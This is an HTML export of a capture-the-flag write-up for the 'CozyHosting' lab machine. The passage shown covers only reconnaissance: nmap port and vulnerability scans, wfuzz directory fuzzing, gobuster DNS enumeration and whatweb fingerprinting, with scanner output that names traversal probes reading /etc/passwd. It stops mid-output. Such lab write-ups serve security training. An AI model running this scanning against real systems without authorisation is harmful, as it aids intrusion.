@@ -1,0 +1,924 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>CozyHosting - 10.10.11.230</title><style>
+    /* cspell:disable-file */
+    /* webkit printing magic: print all background colors */
+    html {
+        -webkit-print-color-adjust: exact;
+    }
+    * {
+        box-sizing: border-box;
+        -webkit-print-color-adjust: exact;
+    }
+    
+    html,
+    body {
+        margin: 0;
+        padding: 0;
+    }
+    @media only screen {
+        body {
+            margin: 2em auto;
+            max-width: 900px;
+            color: rgb(55, 53, 47);
+        }
+    }
+    
+    body {
+        line-height: 1.5;
+        white-space: pre-wrap;
+    }
+    
+    a,
+    a.visited {
+        color: inherit;
+        text-decoration: underline;
+    }
+    
+    .pdf-relative-link-path {
+        font-size: 80%;
+        color: #444;
+    }
+    
+    h1,
+    h2,
+    h3 {
+        letter-spacing: -0.01em;
+        line-height: 1.2;
+        font-weight: 600;
+        margin-bottom: 0;
+    }
+    
+    .page-title {
+        font-size: 2.5rem;
+        font-weight: 700;
+        margin-top: 0;
+        margin-bottom: 0.75em;
+    }
+    
+    h1 {
+        font-size: 1.875rem;
+        margin-top: 1.875rem;
+    }
+    
+    h2 {
+        font-size: 1.5rem;
+        margin-top: 1.5rem;
+    }
+    
+    h3 {
+        font-size: 1.25rem;
+        margin-top: 1.25rem;
+    }
+    
+    .source {
+        border: 1px solid #ddd;
+        border-radius: 3px;
+        padding: 1.5em;
+        word-break: break-all;
+    }
+    
+    .callout {
+        border-radius: 3px;
+        padding: 1rem;
+    }
+    
+    figure {
+        margin: 1.25em 0;
+        page-break-inside: avoid;
+    }
+    
+    figcaption {
+        opacity: 0.5;
+        font-size: 85%;
+        margin-top: 0.5em;
+    }
+    
+    mark {
+        background-color: transparent;
+    }
+    
+    .indented {
+        padding-left: 1.5em;
+    }
+    
+    hr {
+        background: transparent;
+        display: block;
+        width: 100%;
+        height: 1px;
+        visibility: visible;
+        border: none;
+        border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+    }
+    
+    img {
+        max-width: 100%;
+    }
+    
+    @media only print {
+        img {
+            max-height: 100vh;
+            object-fit: contain;
+        }
+    }
+    
+    @page {
+        margin: 1in;
+    }
+    
+    .collection-content {
+        font-size: 0.875rem;
+    }
+    
+    .column-list {
+        display: flex;
+        justify-content: space-between;
+    }
+    
+    .column {
+        padding: 0 1em;
+    }
+    
+    .column:first-child {
+        padding-left: 0;
+    }
+    
+    .column:last-child {
+        padding-right: 0;
+    }
+    
+    .table_of_contents-item {
+        display: block;
+        font-size: 0.875rem;
+        line-height: 1.3;
+        padding: 0.125rem;
+    }
+    
+    .table_of_contents-indent-1 {
+        margin-left: 1.5rem;
+    }
+    
+    .table_of_contents-indent-2 {
+        margin-left: 3rem;
+    }
+    
+    .table_of_contents-indent-3 {
+        margin-left: 4.5rem;
+    }
+    
+    .table_of_contents-link {
+        text-decoration: none;
+        opacity: 0.7;
+        border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+    }
+    
+    table,
+    th,
+    td {
+        border: 1px solid rgba(55, 53, 47, 0.09);
+        border-collapse: collapse;
+    }
+    
+    table {
+        border-left: none;
+        border-right: none;
+    }
+    
+    th,
+    td {
+        font-weight: normal;
+        padding: 0.25em 0.5em;
+        line-height: 1.5;
+        min-height: 1.5em;
+        text-align: left;
+    }
+    
+    th {
+        color: rgba(55, 53, 47, 0.6);
+    }
+    
+    ol,
+    ul {
+        margin: 0;
+        margin-block-start: 0.6em;
+        margin-block-end: 0.6em;
+    }
+    
+    li > ol:first-child,
+    li > ul:first-child {
+        margin-block-start: 0.6em;
+    }
+    
+    ul > li {
+        list-style: disc;
+    }
+    
+    ul.to-do-list {
+        padding-inline-start: 0;
+    }
+    
+    ul.to-do-list > li {
+        list-style: none;
+    }
+    
+    .to-do-children-checked {
+        text-decoration: line-through;
+        opacity: 0.375;
+    }
+    
+    ul.toggle > li {
+        list-style: none;
+    }
+    
+    ul {
+        padding-inline-start: 1.7em;
+    }
+    
+    ul > li {
+        padding-left: 0.1em;
+    }
+    
+    ol {
+        padding-inline-start: 1.6em;
+    }
+    
+    ol > li {
+        padding-left: 0.2em;
+    }
+    
+    .mono ol {
+        padding-inline-start: 2em;
+    }
+    
+    .mono ol > li {
+        text-indent: -0.4em;
+    }
+    
+    .toggle {
+        padding-inline-start: 0em;
+        list-style-type: none;
+    }
+    
+    /* Indent toggle children */
+    .toggle > li > details {
+        padding-left: 1.7em;
+    }
+    
+    .toggle > li > details > summary {
+        margin-left: -1.1em;
+    }
+    
+    .selected-value {
+        display: inline-block;
+        padding: 0 0.5em;
+        background: rgba(206, 205, 202, 0.5);
+        border-radius: 3px;
+        margin-right: 0.5em;
+        margin-top: 0.3em;
+        margin-bottom: 0.3em;
+        white-space: nowrap;
+    }
+    
+    .collection-title {
+        display: inline-block;
+        margin-right: 1em;
+    }
+    
+    .page-description {
+        margin-bottom: 2em;
+    }
+    
+    .simple-table {
+        margin-top: 1em;
+        font-size: 0.875rem;
+        empty-cells: show;
+    }
+    .simple-table td {
+        height: 29px;
+        min-width: 120px;
+    }
+    
+    .simple-table th {
+        height: 29px;
+        min-width: 120px;
+    }
+    
+    .simple-table-header-color {
+        background: rgb(247, 246, 243);
+        color: black;
+    }
+    .simple-table-header {
+        font-weight: 500;
+    }
+    
+    time {
+        opacity: 0.5;
+    }
+    
+    .icon {
+        display: inline-block;
+        max-width: 1.2em;
+        max-height: 1.2em;
+        text-decoration: none;
+        vertical-align: text-bottom;
+        margin-right: 0.5em;
+    }
+    
+    img.icon {
+        border-radius: 3px;
+    }
+    
+    .user-icon {
+        width: 1.5em;
+        height: 1.5em;
+        border-radius: 100%;
+        margin-right: 0.5rem;
+    }
+    
+    .user-icon-inner {
+        font-size: 0.8em;
+    }
+    
+    .text-icon {
+        border: 1px solid #000;
+        text-align: center;
+    }
+    
+    .page-cover-image {
+        display: block;
+        object-fit: cover;
+        width: 100%;
+        max-height: 30vh;
+    }
+    
+    .page-header-icon {
+        font-size: 3rem;
+        margin-bottom: 1rem;
+    }
+    
+    .page-header-icon-with-cover {
+        margin-top: -0.72em;
+        margin-left: 0.07em;
+    }
+    
+    .page-header-icon img {
+        border-radius: 3px;
+    }
+    
+    .link-to-page {
+        margin: 1em 0;
+        padding: 0;
+        border: none;
+        font-weight: 500;
+    }
+    
+    p > .user {
+        opacity: 0.5;
+    }
+    
+    td > .user,
+    td > time {
+        white-space: nowrap;
+    }
+    
+    input[type="checkbox"] {
+        transform: scale(1.5);
+        margin-right: 0.6em;
+        vertical-align: middle;
+    }
+    
+    p {
+        margin-top: 0.5em;
+        margin-bottom: 0.5em;
+    }
+    
+    .image {
+        border: none;
+        margin: 1.5em 0;
+        padding: 0;
+        border-radius: 0;
+        text-align: center;
+    }
+    
+    .code,
+    code {
+        background: rgba(135, 131, 120, 0.15);
+        border-radius: 3px;
+        padding: 0.2em 0.4em;
+        border-radius: 3px;
+        font-size: 85%;
+        tab-size: 2;
+    }
+    
+    code {
+        color: #eb5757;
+    }
+    
+    .code {
+        padding: 1.5em 1em;
+    }
+    
+    .code-wrap {
+        white-space: pre-wrap;
+        word-break: break-all;
+    }
+    
+    .code > code {
+        background: none;
+        padding: 0;
+        font-size: 100%;
+        color: inherit;
+    }
+    
+    blockquote {
+        font-size: 1.25em;
+        margin: 1em 0;
+        padding-left: 1em;
+        border-left: 3px solid rgb(55, 53, 47);
+    }
+    
+    .bookmark {
+        text-decoration: none;
+        max-height: 8em;
+        padding: 0;
+        display: flex;
+        width: 100%;
+        align-items: stretch;
+    }
+    
+    .bookmark-title {
+        font-size: 0.85em;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        height: 1.75em;
+        white-space: nowrap;
+    }
+    
+    .bookmark-text {
+        display: flex;
+        flex-direction: column;
+    }
+    
+    .bookmark-info {
+        flex: 4 1 180px;
+        padding: 12px 14px 14px;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+    }
+    
+    .bookmark-image {
+        width: 33%;
+        flex: 1 1 180px;
+        display: block;
+        position: relative;
+        object-fit: cover;
+        border-radius: 1px;
+    }
+    
+    .bookmark-description {
+        color: rgba(55, 53, 47, 0.6);
+        font-size: 0.75em;
+        overflow: hidden;
+        max-height: 4.5em;
+        word-break: break-word;
+    }
+    
+    .bookmark-href {
+        font-size: 0.75em;
+        margin-top: 0.25em;
+    }
+    
+    .sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+    .code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+    .serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+    .mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+    .pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+    .pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+    .pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+    .pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+    .pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+    .pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+    .pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+    .pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+    .pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+    .pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+    .pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+    .pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+    .pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+    .pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+    .pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+    .pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+    .highlight-default {
+        color: rgba(55, 53, 47, 1);
+    }
+    .highlight-gray {
+        color: rgba(120, 119, 116, 1);
+        fill: rgba(120, 119, 116, 1);
+    }
+    .highlight-brown {
+        color: rgba(159, 107, 83, 1);
+        fill: rgba(159, 107, 83, 1);
+    }
+    .highlight-orange {
+        color: rgba(217, 115, 13, 1);
+        fill: rgba(217, 115, 13, 1);
+    }
+    .highlight-yellow {
+        color: rgba(203, 145, 47, 1);
+        fill: rgba(203, 145, 47, 1);
+    }
+    .highlight-teal {
+        color: rgba(68, 131, 97, 1);
+        fill: rgba(68, 131, 97, 1);
+    }
+    .highlight-blue {
+        color: rgba(51, 126, 169, 1);
+        fill: rgba(51, 126, 169, 1);
+    }
+    .highlight-purple {
+        color: rgba(144, 101, 176, 1);
+        fill: rgba(144, 101, 176, 1);
+    }
+    .highlight-pink {
+        color: rgba(193, 76, 138, 1);
+        fill: rgba(193, 76, 138, 1);
+    }
+    .highlight-red {
+        color: rgba(212, 76, 71, 1);
+        fill: rgba(212, 76, 71, 1);
+    }
+    .highlight-gray_background {
+        background: rgba(241, 241, 239, 1);
+    }
+    .highlight-brown_background {
+        background: rgba(244, 238, 238, 1);
+    }
+    .highlight-orange_background {
+        background: rgba(251, 236, 221, 1);
+    }
+    .highlight-yellow_background {
+        background: rgba(251, 243, 219, 1);
+    }
+    .highlight-teal_background {
+        background: rgba(237, 243, 236, 1);
+    }
+    .highlight-blue_background {
+        background: rgba(231, 243, 248, 1);
+    }
+    .highlight-purple_background {
+        background: rgba(244, 240, 247, 0.8);
+    }
+    .highlight-pink_background {
+        background: rgba(249, 238, 243, 0.8);
+    }
+    .highlight-red_background {
+        background: rgba(253, 235, 236, 1);
+    }
+    .block-color-default {
+        color: inherit;
+        fill: inherit;
+    }
+    .block-color-gray {
+        color: rgba(120, 119, 116, 1);
+        fill: rgba(120, 119, 116, 1);
+    }
+    .block-color-brown {
+        color: rgba(159, 107, 83, 1);
+        fill: rgba(159, 107, 83, 1);
+    }
+    .block-color-orange {
+        color: rgba(217, 115, 13, 1);
+        fill: rgba(217, 115, 13, 1);
+    }
+    .block-color-yellow {
+        color: rgba(203, 145, 47, 1);
+        fill: rgba(203, 145, 47, 1);
+    }
+    .block-color-teal {
+        color: rgba(68, 131, 97, 1);
+        fill: rgba(68, 131, 97, 1);
+    }
+    .block-color-blue {
+        color: rgba(51, 126, 169, 1);
+        fill: rgba(51, 126, 169, 1);
+    }
+    .block-color-purple {
+        color: rgba(144, 101, 176, 1);
+        fill: rgba(144, 101, 176, 1);
+    }
+    .block-color-pink {
+        color: rgba(193, 76, 138, 1);
+        fill: rgba(193, 76, 138, 1);
+    }
+    .block-color-red {
+        color: rgba(212, 76, 71, 1);
+        fill: rgba(212, 76, 71, 1);
+    }
+    .block-color-gray_background {
+        background: rgba(241, 241, 239, 1);
+    }
+    .block-color-brown_background {
+        background: rgba(244, 238, 238, 1);
+    }
+    .block-color-orange_background {
+        background: rgba(251, 236, 221, 1);
+    }
+    .block-color-yellow_background {
+        background: rgba(251, 243, 219, 1);
+    }
+    .block-color-teal_background {
+        background: rgba(237, 243, 236, 1);
+    }
+    .block-color-blue_background {
+        background: rgba(231, 243, 248, 1);
+    }
+    .block-color-purple_background {
+        background: rgba(244, 240, 247, 0.8);
+    }
+    .block-color-pink_background {
+        background: rgba(249, 238, 243, 0.8);
+    }
+    .block-color-red_background {
+        background: rgba(253, 235, 236, 1);
+    }
+    .select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+    .select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+    .select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+    .select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+    .select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+    .select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+    .select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+    .select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+    .select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+    .select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+    .select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+    .select-value-color-pageGlass { background-color: undefined; }
+    .select-value-color-washGlass { background-color: undefined; }
+    
+    .checkbox {
+        display: inline-flex;
+        vertical-align: text-bottom;
+        width: 16;
+        height: 16;
+        background-size: 16px;
+        margin-left: 2px;
+        margin-right: 5px;
+    }
+    
+    .checkbox-on {
+        background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+    }
+    
+    .checkbox-off {
+        background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+    }
+        
+    </style></head><body><article id="cd13d7f7-2b2b-4ec0-9ba9-6fb47d448281" class="page sans"><header><h1 class="page-title">CozyHosting - 10.10.11.230</h1><p class="page-description"></p></header><div class="page-body"><h1 id="55fd9cb9-b04a-4202-9410-374b59c136fe" class="">Information Gathering &amp; Enumeration</h1><p id="6c878c8b-be54-464a-b54c-b24a3259dd0f" class="">We start with NMAP, dns enumeration and dir enumeration and opening that IP on browser</p><h2 id="632cb30e-5ae3-4bce-95c6-c0c3042ede90" class="">NMAP</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="64635052-0b7d-48e9-b7c5-d9507abb8e63" class="code"><code class="language-JavaScript">┌──(drroot㉿drroot)-[~/Escritorio/.page/drroot.github.io]
+    └─$ nmap -sVC -T5 -n 10.10.11.230
+    Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-18 12:57 -05
+    Nmap scan report for 10.10.11.230
+    Host is up (0.10s latency).
+    Not shown: 998 closed tcp ports (conn-refused)
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey: 
+    |   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
+    |_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
+    80/tcp open  http    nginx 1.18.0 (Ubuntu)
+    |_http-server-header: nginx/1.18.0 (Ubuntu)
+    |_http-title: Did not follow redirect to http://cozyhosting.htb
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+    
+    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 14.91 seconds</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5a7fb347-fd73-498a-9cc2-4bd13e0d65c7" class="code"><code class="language-JavaScript">┌──(drroot㉿drroot)-[~/Escritorio/.page/drroot.github.io]
+    └─$ nmap --script vuln cozyhosting.htb 
+    Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-18 13:08 -05
+    Pre-scan script results:
+    | broadcast-avahi-dos: 
+    |   Discovered hosts:
+    |     224.0.0.251
+    |   After NULL UDP avahi packet DoS (CVE-2011-1002).
+    |_  Hosts are all up (not vulnerable).
+    Nmap scan report for cozyhosting.htb (10.10.11.230)
+    Host is up (0.10s latency).
+    Not shown: 998 closed tcp ports (conn-refused)
+    PORT   STATE SERVICE
+    22/tcp open  ssh
+    80/tcp open  http
+    |_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.
+    | http-enum: 
+    |   //system.html: CMNC-200 IP Camera
+    |   /Citrix//AccessPlatform/auth/clientscripts/cookies.js: Citrix
+    |   /.nsf/../winnt/win.ini: Lotus Domino
+    |   /uir//etc/passwd: Possible D-Link router directory traversal vulnerability (CVE-2018-10822)
+    |_  /uir//tmp/csman/0: Possible D-Link router plaintext password file exposure (CVE-2018-10824)
+    | http-csrf: 
+    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=cozyhosting.htb
+    |   Found the following possible CSRF vulnerabilities: 
+    |     
+    |     Path: http://cozyhosting.htb:80/login
+    |     Form id: inputgroupprepend
+    |_    Form action: /login
+    |_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.
+    
+    Nmap done: 1 IP address (1 host up) scanned in 302.92 seconds</code></pre><p id="f3feb5f9-2344-4e2f-99d9-6fa8ce4a0370" class="">
+    </p><h2 id="f69ac33c-2225-43d8-b331-27bdc20e7938" class="">Browser</h2><figure id="431a3854-15a2-4214-86e9-b56eacb2cd84" class="image"><a href="../img/CozyHosting/Untitled.png"><img style="width:1920px" src="../img/CozyHosting/Untitled.png"/></a></figure><p id="a1b66b83-0c69-4482-981f-2cedf84d5ff7" class="">Adding cozyhosting.htb to /etc/hosts</p><figure id="c70514c9-a846-42d6-a6ce-df819afe53a6" class="image"><a href="../img/CozyHosting/Untitled 1.png"><img style="width:475px" src="../img/CozyHosting/Untitled 1.png"/></a></figure><figure id="664bf95e-ac0d-41f8-9e14-3f94027195bb" class="image"><a href="../img/CozyHosting/Untitled 2.png"><img style="width:945px" src="../img/CozyHosting/Untitled 2.png"/></a></figure><figure id="f788fe49-ab79-4a2c-96e5-7d066421cf47" class="image"><a href="../img/CozyHosting/Untitled 3.png"><img style="width:1913px" src="../img/CozyHosting/Untitled 3.png"/></a></figure><figure id="816f4f15-4ac2-43e8-ac9b-4e4c78449ac9" class="image"><a href="../img/CozyHosting/Untitled 4.png"><img style="width:562px" src="../img/CozyHosting/Untitled 4.png"/></a></figure><figure id="b4984750-5587-4651-ad0a-261bf4f9a779" class="image"><a href="../img/CozyHosting/Untitled 5.png"><img style="width:694px" src="../img/CozyHosting/Untitled 5.png"/></a></figure><figure id="9ba0d7ba-33b2-456f-b78f-95fc8c1e28be" class="image"><a href="../img/CozyHosting/Untitled 6.png"><img style="width:1059px" src="../img/CozyHosting/Untitled 6.png"/></a></figure><h2 id="224c6a6f-e7b6-4a42-9d8e-17a5f6b93a22" class="">DIRECTORY ENUMERATION</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="405d5bf4-e898-45b7-94bf-702b4a3d9b45" class="code"><code class="language-JavaScript">┌──(drroot㉿drroot)-[~/Escritorio/.page/drroot.github.io]
+    └─$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://cozyhosting.htb/FUZZ -t 50 --sc 200
+     /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.
+    ********************************************************
+    * Wfuzz 3.1.0 - The Web Fuzzer                         *
+    ********************************************************
+    
+    Target: http://cozyhosting.htb/FUZZ
+    Total requests: 30000
+    
+    =====================================================================
+    ID           Response   Lines    Word       Chars       Payload                                             
+    =====================================================================
+    
+    000000039:   200        96 L     196 W      4431 Ch     &quot;login&quot;                                             
+    000000245:   200        284 L    745 W      12706 Ch    &quot;index&quot;                                             
+    000004255:   200        284 L    745 W      12706 Ch    &quot;http://cozyhosting.htb/&quot;</code></pre><h2 id="fae102c6-66c8-4515-af17-5d058c866f48" class="">DNS ENUMERATION</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="87618d79-f643-4fc1-b683-be85e60d8943" class="code"><code class="language-JavaScript">┌──(drroot㉿drroot)-[~/Escritorio/.page/drroot.github.io]
+    └─$ gobuster dns -d cozyhosting.htb -t 50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt 
+    ===============================================================
+    Gobuster v3.6
+    by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+    ===============================================================
+    [+] Domain:     cozyhosting.htb
+    [+] Threads:    50
+    [+] Timeout:    1s
+    [+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+    ===============================================================
+    Starting gobuster in DNS enumeration mode
+    ===============================================================
+    Progress: 19966 / 19967 (99.99%)
+    ===============================================================
+    Finished
+    ===============================================================</code></pre><p id="585c2e24-9b5a-4d6b-9965-23298ef79208" class="">
+    </p><h2 id="bd7e0935-d8b8-40a7-a34a-3e872e17f7a2" class="">Whatweb</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5dfa81cd-0c0a-47f4-9ed1-9af67c1d772f" class="code"><code class="language-JavaScript">┌──(drroot㉿drroot)-[~/Escritorio/.page/drroot.github.io]
+    └─$ whatweb &quot;http://cozyhosting.htb/login&quot; -a 3
+    http://cozyhosting.htb/login [200 OK] Bootstrap, Content-Language[en-US], 
+    Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], 
+    IP[10.10.11.230], PasswordField[password], Title[Login - Cozy Hosting], 
+    UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], 
+    X-XSS-Protection[0], nginx[1.18.0]
+                                                                                                                         
+    ┌──(drroot㉿drroot)-[~/Escritorio/.page/drroot.github.io]
+    └─$ whatweb &quot;http://cozyhosting.htb/&quot; -a 3     
+    http://cozyhosting.htb/ [200 OK] Bootstrap, Content-Language[en-US], 
+    Country[RESERVED][ZZ], Email[info@cozyhosting.htb], HTML5, 
+    HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.230], 
+    Lightbox, Script, Title[Cozy Hosting - Home], 
+    UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], 
